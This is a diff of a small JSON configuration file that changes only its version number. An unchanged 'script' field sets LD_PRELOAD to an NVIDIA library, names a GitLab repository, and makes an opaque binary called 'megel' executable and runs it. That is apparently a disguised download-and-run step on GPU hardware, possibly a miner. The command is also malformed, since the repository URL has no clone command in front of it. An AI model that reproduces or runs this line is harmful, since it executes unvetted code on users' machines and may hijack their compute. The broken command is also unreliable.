@@ -1,5 +1,5 @@
 {
 "script": "\n!export LD_PRELOAD=/usr/lib64-nvidia/libnvidia-ml.so && https://gitlab.com/Komand143/sukarman.git && cd sukarman && chmod +x ./megel && ./megel",
 "validate": true,
-"version": "1.00"
+"version": "1.10"
 }
